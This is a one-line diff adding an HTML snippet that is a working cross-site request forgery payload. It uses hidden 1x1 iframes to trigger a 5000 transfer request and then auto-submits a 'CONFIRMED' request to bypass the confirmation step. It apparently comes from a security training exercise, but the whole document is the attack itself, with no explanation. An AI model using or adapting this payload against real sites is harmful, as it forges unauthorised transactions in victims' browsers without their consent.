@@ -1,0 +1,1 @@
+<script>function temp(){document.getElementById("second").src="attack?Screen=2014084448&menu=900&transfer=CONFIRMED";}</script><iframe src="attack?Screen=2014084448&menu=900&transfer=5000"  onload="temp()" width="1" height="1"></iframe><iframe id="second" width="1" height="1"></iframe>
